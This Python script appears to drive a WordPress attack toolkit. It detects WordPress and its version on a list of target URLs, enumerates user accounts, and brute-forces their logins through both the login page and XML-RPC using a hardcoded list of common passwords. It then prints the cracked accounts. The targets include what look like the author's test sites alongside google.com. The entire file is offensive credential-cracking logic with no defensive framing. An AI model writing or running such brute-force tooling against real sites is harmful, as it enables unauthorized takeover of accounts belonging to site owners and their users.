import itertools
import requests

from config import logs
from http_handler.proxy import Proxy
from wordpress import WPLoginPageBruteforcer, WPXmlrpcBruteforcer, WPDetector, WPEnumerator


def main():
    webs = list()
    webs.append("https://elrodev.000webhostapp.com/")
    webs.append("https://elro-sec.com/dev1/")
    webs.append("https://elro-sec.com/dev2/")
    webs.append("https://elro-sec.com/dev3/")
    webs.append("https://www.google.com/")
    webs.append("tttteeeeeesssssssstttttt")
    webs.append("tttteeeeeessssssssttt.com")

    for i in range(1):
        url = webs[i]
        passwords = ["123456", "Aa100100", "Admin123", "Aa123123", "admin", "administrator", "Admin1234"]

        # first checking if wp
        det = WPDetector(url)
        is_wp = det.detect()
        if is_wp:
            # then getting the version
            ver = det.get_version()
            print("the version is: {}".format(ver))
        enum = WPEnumerator(url)
        # then enumerating the users if possible
        enumerated_users_dict = enum.enumerate()
        print(enumerated_users_dict)
        enumerated_users = list(enumerated_users_dict.values())
        enumerated_count = len(enumerated_users)
        if enumerated_count > 0:
            login_bfr = WPLoginPageBruteforcer(url)
            login_cracked_users = login_bfr.bruteforce(enumerated_users, passwords)
            print("cracked users dict through login: ", login_cracked_users)
            xml_bfr = WPXmlrpcBruteforcer(enumerated_users, passwords)
            xml_cracked_users = xml_bfr.bruteforce(enumerated_users, passwords)
            print("cracked users dict through xml: ", xml_cracked_users)
        print(enumerated_count)
        for i in range(len(enumerated_users)):
            print("#"+str(i+1)+": "+str(enumerated_users[i]))


if __name__ == '__main__':
    main()
